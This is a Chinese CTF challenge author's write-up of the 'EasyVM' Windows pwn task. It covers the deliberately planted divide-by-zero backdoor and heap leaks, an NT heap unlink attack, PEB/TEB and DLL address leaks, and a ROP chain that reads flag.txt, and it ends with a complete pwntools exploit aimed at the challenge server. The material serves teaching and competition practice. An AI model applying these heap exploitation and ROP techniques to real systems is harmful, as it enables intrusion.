EasyVM自定义了一些简单指令实现了一个简易vm，提供一些基本的指令，包括算数，分支以及文件操作相关的系统调用。
不过因为在windows平台下，所以主要是windows下的利用。
（第一次对外出题，质量不高，师傅们见谅）



### 缓解机制

`start.ps1`中，通过`Set-ProcessMitigation -Name EasyVM.exe -Enable DisallowChildProcessCreation`禁止了EasyVM.exe创建子进程，因此无法通过`system`来获取shell，只能进行orw。



### 指令构成

指令的格式如下，按照小端序：

```C
 0000       0          00		 000      000       000         ...
opcode   reg_op     bitwidth   dst_reg  src_reg1  src_reg2      imm
```

指令长度为2 ~ 10bytes，主要取决于立即数的长度。

其中`opcode`决定指令类型，`reg_op`选择是否是寄存器操作，`bitwidth`决定操作数的长度，`xx_regx`决定对应寄存器的下标，`imm`即立即数的值。



### VM初始化

进行初始化操作时，主要是进行内存申请，以及初始化系统调用和VM中的自定义异常处理函数等操作：

```C
typedef struct File
{
	char filename[0x10];
	uint64_t length;
	char* buffer;
} File, *File_t;

typedef struct VMState
{
	int64_t regs[10];
	char *code;
	uint64_t code_len;
	uint64_t *stack;
	uint64_t stack_len;
	char* data;
	uint64_t data_len;
	void (*ExceptionTable[5])(struct VMState *);
	void (*SyscallTable[4])(struct VMState *);
	File_t files[0x10];
} VMState, *VMState_t;

HANDLE StateHeap;
HANDLE FileHeap;
HANDLE BufferHeap;

void InitPrivateHeap()
{
	StateHeap = HeapCreate(0, 0x1000, 0);
	FileHeap = HeapCreate(0, 0x1000, 0);
	BufferHeap = HeapCreate(0, 0x1000, 0);

	if (StateHeap == NULL || FileHeap == NULL || BufferHeap == NULL)
		Error("Create heap failed!");
}

void InitFunctionTables(VMState_t state)
{
	/* To be done */
	state->ExceptionTable[EC_STACK_UNDERFLOW] = stack_underflow;
	state->ExceptionTable[EC_STACK_OVERFLOW] = stack_overflow;
	state->ExceptionTable[EC_ILLEGAL_INSTRUCTION] = illegal_instruction;
	state->ExceptionTable[EC_CODE_BUFFER_VIOLATION] = code_buffer_violation;
	state->ExceptionTable[EC_DATA_BUFFER_VIOLATION] = data_buffer_violation;

	state->SyscallTable[SN_READ] = do_sys_read;
	state->SyscallTable[SN_WRITE] = do_sys_write;
	state->SyscallTable[SN_OPEN] = do_sys_open;
	state->SyscallTable[SN_CLOSE] = do_sys_close;
}

VMState_t InitVM()
{
	VMState_t state = (VMState_t)HeapAlloc(StateHeap, HEAP_ZERO_MEMORY, sizeof(VMState));
	if (state == NULL)
		Error("Create VM failed!");

	InitRegs(state);

	state->code = (char *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, CODE_SIZE);
	state->code_len = CODE_SIZE;
	state->stack = (uint64_t *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, STACK_SIZE);
	state->stack_len = STACK_SIZE / 8;
	state->data = (char *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, DATA_SIZE);
	state->data_len = DATA_SIZE;
	if (state->code == NULL || state->stack == NULL || state->data == NULL)
		Error("Init VM code buffer or stack buffer or data buffer failed!");

	InitFunctionTables(state);
	ClearFiles(state);

	return state;
}
```

其中初始化了三个私有堆，`StateHeap`用于分配`VMState`结构体的内存，`FileHeap`用于分配`File`结构体的内存，`BufferHeap`用于分配具体的代码、数据、栈的内存以及File buffer的内存，这里主要是为了对三类内存进行一定的隔离。



### 漏洞

在对`DIV`指令进行解析的过程中，虽然对除以0的情况有一定的检查，但是检查并不严格；如果`reg_op`是1（即操作数都是寄存器），由于检查的是8 bytes长度的寄存器的值非0，但是实际运算的时候根据指令中`bitwidth`进行掩码操作后，低bytes仍可能为0，因此同样会触发除以0的操作：

```C
void OperDiv(VMState_t state)
{
	int64_t src_reg_0_val, src_reg_1_val, src_imm;

	if (REG_OP)
	{
		if (state->regs[SRC_REG_1] == 0)
		{
			puts("Warning: Divide by zero, skipped\n");

			state->regs[RG_PC] += 2;

			return;
		}

		src_reg_0_val = MASK(state->regs[SRC_REG_0]);
		src_reg_1_val = MASK(state->regs[SRC_REG_1]);

		state->regs[DST_REG] = MASK(src_reg_0_val / src_reg_1_val);

		state->regs[RG_PC] += 2;
	}
	else
	{
		if (IMM_8 == 0)
		{
			puts("Warning: Divide by zero, skipped\n");

			state->regs[RG_PC] += 2 + (1ULL << BITWIDTH);

			return;
		}

		switch (BITWIDTH)
		{
			case BW_BYTE:
				src_imm = IMM_8;
				break;
			case BW_WORD:
				src_imm = IMM_16;
				break;
			case BW_DWORD:
				src_imm = IMM_32;
				break;
			case BW_QWORD:
				src_imm = IMM_64;
				break;
			default:
				src_imm = 0;
				break;
		}

		src_reg_0_val = MASK(state->regs[SRC_REG_0]);

		state->regs[DST_REG] = MASK(src_reg_0_val / src_imm);

		state->regs[RG_PC] += 2 + (1ULL << BITWIDTH);
	}
}
```

此外，由于IDA的伪代码是看不到异常处理相关的代码的，但是如果进行测试的话，会发现即使引入了除以0的操作，程序仍然会正常往下执行。

这里就可以发现其实是存在异常处理逻辑的（当然源代码十分明显，IDA如果看反汇编窗口的话也能捕捉到异常处理的部分）：

```C
__try
{
	OperDiv(state);
}
__except (1)
{
	puts("Warning: Divide by zero, skipped\n");
	state->regs[RG_PC] += 2;
	state->SyscallTable[SN_WRITE] = do_sys_write_vul;
}
```

异常处理的部分触发后，`write`系统调用的函数被修改了，修改后的`do_sys_write_vul`引入了后门（比较刻意），使得后续在进行`write`时，可以越界写File buffer：

```C
void do_sys_write_vul(VMState_t state)
{
	int64_t arg0 = state->regs[RG_R1];
	int64_t arg1 = state->regs[RG_R2];
	int64_t arg2 = state->regs[RG_R3];

	if (arg1 < 0 || (uint64_t)arg1 >= state->data_len || (uint64_t)arg2 > state->data_len - arg1)
		state->ExceptionTable[EC_DATA_BUFFER_VIOLATION](state);

	if (arg0 < 3)
	{
		state->regs[RG_R0] = _write(arg0, state->data + arg1, arg2);
	}
	else if (arg0 < 0x10)
	{
		if (state->files[arg0] != NULL)
		{
			if (state->files[arg0]->length < (uint64_t)arg2)
			{
				HeapFree(BufferHeap, 0, state->files[arg0]->buffer);
				state->files[arg0]->buffer = (char*)HeapAlloc(BufferHeap, 0, state->files[arg0]->length);
				if (state->files[arg0]->buffer == NULL)
					Error("Unexpected error!");
				/* Not change file->length here to avoid OOB read */
			}
			/* OOB write here to do unlink attack */
			memcpy(state->files[arg0]->buffer, state->data + arg1, arg2);

			state->regs[RG_R0] = arg2;
		}
	}
}
```

存在对File buffer（也就是BufferHeap上）OOB write后，利用方法就是进行Unlink attack，这与Linux下的Unlink attack几乎一致。



### 信息泄露

但目前为止仍然无法完成利用，因为Windows NT heap下chunk（`_HEAP_ENTRY`）的header都是xor过的，需要得到拿到BufferHeap Encoding才能伪造合法的chunk header。

同时，由于需要进行Unlink attack，则要知道File buffer指针存放的位置，即FileHeap的地址。

注意到VM在执行指令时会检查PC是否越界，如果检查没有通过，则触发VM自定义的异常处理函数`code_buffer_violation`，而这个函数最后是不会调用`exit(1)`而是会继续解析指令执行。

```C
if (state->regs[RG_PC] < 0 || (uint64_t)state->regs[RG_PC] > state->code_len - LONGEST_INSN)
	state->ExceptionTable[EC_CODE_BUFFER_VIOLATION](state);

void code_buffer_violation(VMState_t state)
{
	printf("[!]Error: Code Buffer Out of Bounds\n");
	DumpVMState(state);
	/* Not exit here, to provide information leak bug */
}

void DumpVMState(VMState_t state)
{
	int64_t i;

	printf("R0: 0x%016llx, R1: 0x%016llx\n", state->regs[RG_R0], state->regs[RG_R1]);
	printf("R2: 0x%016llx, R3: 0x%016llx\n", state->regs[RG_R2], state->regs[RG_R3]);
	printf("R4: 0x%016llx, R5: 0x%016llx\n", state->regs[RG_R4], state->regs[RG_R5]);
	printf("R6: 0x%016llx, R7: 0x%016llx\n", state->regs[RG_R6], state->regs[RG_R7]);
	printf("PC: 0x%016llx, SP: 0x%016llx\n", state->regs[RG_PC], state->regs[RG_SP]);

	printf("Stack Buffer:\n");
	for (i = state->regs[RG_SP] - 3; i <= state->regs[RG_SP]; i++)
	{
		printf("\t0x%04llx: 0x%016llx\n", i, state->stack[i]);
	}

	printf("Code Buffer:\n");
	printf("\t");
	for (i = state->regs[RG_PC];  i < state->regs[RG_PC] + 0x10; i++)
	{
		printf("0x%02x ", (unsigned char)state->code[i]);
	}
	printf("\n");

	printf("Opened file:\n");
	for (i = 3; i < 0x10; i++)
	{
		if (state->files[i] != NULL)
			printf("\tfileno: %lld filename: %s filesize: %llu\n", i, state->files[i]->filename, state->files[i]->length);
	}
	printf("\n");
}
```

因此，通过这个`DumpVMState`可以达到信息泄露的目的。

至于具体做法，由于code buffer chunk后面紧接着是stack buffer chunk，所以可以利用这个code buffer的越界，把stack buffer chunk的加密过的header给泄露出来；此外由于stack buffer chunk header的明文内容是可以推断出来的，因此可以通过xor计算出BufferHeap Encoding的值。

同时，在调用`open`系统调用时，`HeapAlloc`的`dwFlags`为0，即没有`HEAP_ZERO_MEMORY`，在申请File结构体的时候不会清空结构体内容，而File->filename也仅仅只是置0了第一个byte，因此可以将chunk的Blink给泄露出来，从而得到`FileBuffer`的地址。

```C
void do_sys_open(VMState_t state)
{
	int64_t arg0 = state->regs[RG_R1];
	int64_t arg1 = state->regs[RG_R2];
	int filename_len;

	if ((uint64_t)arg0 >= state->data_len)
		state->ExceptionTable[EC_DATA_BUFFER_VIOLATION](state);

	filename_len = strlen(state->data + arg0) > state->data_len - arg0 ? state->data_len - arg0 : strlen(state->data + arg0);

	if (arg1 != 0 && arg1 != 1)
	{
		state->regs[RG_R0] = -1;
		return;
	}

	int i;
	for (i = 3; i < 0x10; i++)
	{
		if (state->files[i] == NULL)
			break;
	}

	if (i == 0x10)
	{
		state->regs[RG_R0] = -1;
		return;
	}
	
	state->regs[RG_R0] = i;
	state->files[i] = (File_t)HeapAlloc(FileHeap, 0, sizeof(File));
	if (state->files[i] == NULL)
		Error("Unexpected error!");
	state->files[i]->buffer = NULL;
	state->files[i]->length = 0;
	state->files[i]->filename[0] = 0;
	memcpy(state->files[i]->filename, state->data + arg0, filename_len > 0xF ? 0xF : filename_len);
	state->files[i]->filename[0xF] = 0;
}
```



### 利用过程

因此综合上述分析，可以总结出整个利用过程：

1. 首先调用`open`，补全`File->filename`的前8 bytes内容
2. 然后通过`call`指令到code buffer尾部触发`code_buffer_violation`的异常，并在code buffer尾部设置`ret`指令，使得异常后能够返回继续执行后续指令
3. 从Dump出来的VMState的code信息中，获取到encoded header，计算出BufferHeap的Encoding；以及从file信息中，拿到FileBuffer的内存地址
4. 引入除以0的指令，触发异常处理逻辑，在`write`引入OOB write
5. 利用OOB write进行堆布局，Unlink attack，劫持File->buffer指向自己，从而控制相邻的下一个File结构体的内容，实现任意次数的任意地址读写
6. 利用任意地址读，泄露`FileHeap->LockVariable.Lock`（指向`ntdll!RtlpStaticDebugInfo`某个偏移的位置），从而计算出ntdll的加载地址
7. 利用任意地址读，泄露`ntdll!LdrPeb - 0x98`（指向`peb->TlsBitmapBits`），从而计算出peb的地址；由于teb的地址和peb偏移固定，故也能得到teb的地址
8. 利用任意地址读，泄露peb上的`ImageBaseAddress`（即程序加载地址），以及teb上的`StackBase`
9. 利用任意地址读，泄露程序IAT表的内容，从而得到ucrtbase的加载地址（或者其他dll的加载地址）
10. 利用VM指令，爆破VM异常处理函数执行的栈帧位置，然后利用任意地址写布置ROP进行orw



### 一些可能遇到的问题

1. 在写exp的过程中，由于windows在进行字符流输入时，"\x1A"会被当作字符流的结尾，导致后续输入无法读入内容，所以避免payload中存在"\x1A"

2. 最后的ROP方式与Linux稍微不同，这是由于Windows下函数会开辟一段“register parameter stack area”，所以要进行一定的处理：

   ![stack frame](https://p0.ssl.qhimg.com/t014166c6e2f8d13c81.png)



### Final exp

```python
from pwn import *
import binascii
import sys

context.arch = 'amd64'
context.log_level = 'debug'

# p = remote("127.0.0.1", 9999)
p = remote("124.71.177.202", 9999)
if len(sys.argv) == 2:
    windbgx.attach(p)

opcode = {
    "HALT":     0x0,
    "ADD":      0x1,
    "SUB":      0x2,
    "MUL":      0x3,
    "DIV":      0x4,
    "LD":       0x5,
    "ST":       0x6,
    "PUSH":     0x7,
    "POP":      0x8,
    "JMP":      0x9,
    "JE":       0xA,
    "JNE":      0xB,
    "CALL":     0xC,
    "RET":      0xD,
    "SYSCALL":  0xE
}

bitwidth = {
    8:  0,
    16: 1,
    32: 2,
    64: 3
}

pack_func = [
    p8,
    p16,
    p32,
    p64
]

'''
     0000       0          00		 000      000       000         ...
    opcode   reg_op     bitwidth   dst_reg  src_reg1  src_reg2      imm
'''

def halt():
    ins = p16(opcode['HALT'])
    return ins

def add_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def add_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def sub_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def sub_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def mul_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def mul_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def div_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def div_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def ld(dst, offset, bits_cnt):
    ins_val = opcode['LD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def st(dst, offset, bits_cnt):
    ins_val = opcode['ST']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def push_reg(dst):
    ins_val = opcode['PUSH']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def push_imm(imm):
    ins_val = opcode['PUSH']    
    ins = p16(ins_val) + p64(imm)
    return ins

def pop(dst):
    ins_val = opcode['POP']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def jmp(offset):
    ins_val = opcode['JMP']   
    ins = p16(ins_val) + p16(offset)
    return ins

def je(src1, src2, offset):
    ins_val = opcode['JE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def jne(src1, src2, offset):
    ins_val = opcode['JNE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def call(addr):
    ins_val = opcode['CALL']
    ins = p16(ins_val) + p16(addr)
    return ins

def ret():
    ins = p16(opcode['RET'])
    return ins

def syscall():
    ins = p16(opcode['SYSCALL'])
    return ins

def chunk_head_ctor(size, flags, prev_size, segment_offset, unused_bytes):
    size, prev_size = size >> 4, prev_size >> 4
    chksum = (size >> 8) ^ (size & 0xFF) ^ flags
    head = size | (flags << 16) | (chksum << 24) | (prev_size << 32) | (segment_offset << 48) | (unused_bytes << 56)
    return head

# Leak FileHeap's address
code =  add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # read stdin
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 3
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 3, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # write file 3
code += call(0xFFE)

# BufferHeap Fengshui to do unlink attack
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 4
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 4
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 5
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 5
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 6

# Trigger backdoor to do OOB write
code += add_reg_imm(6, 7, 0x100, 16) + div_reg_reg(0, 7, 6, 8)

# OOB write to hijack chunk head and Flink, Blink
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # write file 4 (OOB write)

# Do unlink attack
code += add_reg_imm(0, 7, 3, 8) + add_reg_imm(1, 7, 4, 8) + syscall()                                                               # close file 4

# now use file 5 to control the struct of file 6 and achieve arbitrary read and write
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()         # read stdin
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()       # read file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()        # write stdout

# arbitrary read
for i in range(4):
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # read stdin
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()    # write stdout

# Bruteforce return address and ROP
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x140, 16) + syscall()   # read stdin
bruteforce_stack_code =  ld(5, 0x138, 64) + ld(4, 0x130, 64) + sub_reg_imm(4, 4, 0x8, 64) + st(4, 0x130, 64)                                                           # stack_addr - 8
bruteforce_stack_code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
bruteforce_stack_code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x300, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
bruteforce_stack_code += ld(6, 0x300, 64) + jne(5, 6, 0xFFC4) # 4 + 4 + 2 * 2 + 3 * 6 + 4 * 2 + 4 * 2 + 10 + 4 = 60 = 0x3C
code += bruteforce_stack_code
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0x130, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()    # write stdout
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x140, 16) + add_reg_imm(3, 7, 0x100, 16) + syscall() # write file 6

'''
################ for test
# arbitrary write
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 6

# trigger system
code += push_imm(u64("calc\x00\x00\x00\x00"))
code += pop(0)
code += pop(1)
code += pop(1)
################ test done
'''

# End here
code += halt()

# Leak BufferHeap's cookie
code = code.ljust(0xFFE, b"\x00")
code += ret()

# Send code
p.sendafter("Please input your code: \r\n", code)

# Get encoded heap head and calculate heap cookie
p.send("heapaddr")
p.recvuntil("0x0d 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00")
chunk_head = p.recvline()[:-3].replace(b" 0x", b"") + b"0010"
chunk_head = u64(binascii.unhexlify(chunk_head).decode('latin-1'))
heap_cookie = chunk_head ^ chunk_head_ctor(0x1010, 1, 0x1010, 0, 0x10)

# Get FileHeap address from uninitialized chunk
p.recvuntil("heapaddr")
heap_base = u64(p.recvuntil(" ")[:-1].ljust(8, b"\x00")) - 0x150

# Send OOB write payload to do unlink attack
payload =  b'A' * 0x38 
payload += p64(heap_cookie ^ chunk_head_ctor(0x40, 0, 0x40, 0, 0))
payload += p64(heap_base + 0x8d8 - 0x8) + p64(heap_base + 0x8d8)
p.send(payload)

# Send payload to control file 6 to leak ntdll              (1)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(heap_base + 0x2c0) # change files[6]->buffer = _HEAP->LockVariable.Lock thus leak the ntdll base
p.send(payload)
p.send("leakaddr") # leak symbol
p.recvuntil("leakaddr")
ntdll_base = u64(p.recv(8)) - 0x163d40
ntdll_pebldr = ntdll_base + 0x1653a0

# Send payload to control file 6 to leak PEB                (2)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(ntdll_pebldr - 0x98) # change files[6]->buffer = ntdll!PebLdr - 0x80
p.send(payload)
p.recvuntil("leakaddr")
peb = u64(p.recv(8)) - 0x80
teb = peb + 0x1000

# Send payload to control file 6 to leak StackBase          (3)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(teb + 0x8) # change files[6]->buffer = teb + 8 (StackBase)
p.send(payload)
p.recvuntil("leakaddr")
stack_base = u64(p.recv(8))

# Send payload to control file 6 to leak Program base       (4)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(peb + 0x10) # change files[6]->buffer = peb + 0x10 (ImageBaseAddress)
p.send(payload)
p.recvuntil("leakaddr")
prog_base = u64(p.recv(8))

# Send payload to control file 6 to leak ucrtbase           (5)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(prog_base + 0x4198) # change files[6]->buffer = _write IAT
p.send(payload)
p.recvuntil("leakaddr")
ucrtbase_base = u64(p.recv(8)) - 0x15bf0
ucrtbase_system = ucrtbase_base + 0xabba0

# Prepare bruteforce function stack address
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'flag.txt'.ljust(0x20, b"\x00") + p64(0x100) + p64(stack_base) # change files[6]->buffer = stack_base
payload += p64(prog_base + 0x20D2) # target symbol value

pop_rcx =    ntdll_base + 0x9217b   # pop rcx ; ret
pop_rdx =    ntdll_base + 0x8fb37   # pop rdx ; pop r11 ; ret
pop_r8 =     ntdll_base + 0x2010b   # pop r8 ; ret
pop_4regs =  ntdll_base + 0x8fb33   # pop r9 ; pop r10 ; pop r11 ; ret
_open =   ucrtbase_base + 0xa2a30
_read =   ucrtbase_base + 0x16270
_write =  ucrtbase_base + 0x15bf0
ropchain =  p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rdx) + p64(0) + p64(0) + p64(_open) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(3) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_read) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(1) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_write)
# ropchain = p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rcx + 1) + p64(ucrtbase_system)

payload += ropchain
p.send(payload)
function_stack_addr = u64(p.recv(8))

'''
################ for test, write exception table and syscall table

# Send payload to control file 6 to leak StateHeap          (6)
payload =  pg
64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(ntdll_base + 0x168d40 + 0x10) # change files[6]->buffer = ntdll!RtlpProcessHeapsListBuffer + 0x10 (StateHeap)
p.send(payload)
p.recvuntil("leakaddr")
state_heap_base = u64(p.recv(8))

# Send payload to control file 6 to hijack state->exception_table to system
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(state_heap_base + 0x8e0) # change files[6]->buffer = state->exception_table
p.send(payload)
payload = p64(ucrtbase_system) * 7
p.send(payload)

################ test done
'''

print("------------- Leaked Information -------------")
print("[+] BufferHeap cookie: " + hex(heap_cookie))
print("[+] BufferHeap base: " + hex(heap_base))
print("[+] ntdll base: " + hex(ntdll_base))
print("[+] ucrtbase base: " + hex(ucrtbase_base))
print("[+] PEB: " + hex(peb))
print("[+] TEB: " + hex(teb))
print("[+] prog_base: " + hex(prog_base))
print("[+] stack_base: " + hex(stack_base))
print("[+] function_stack_addr: " + hex(function_stack_addr))
# print("[+] state_heap_base: " + hex(state_heap_base))

p.interactive()
```

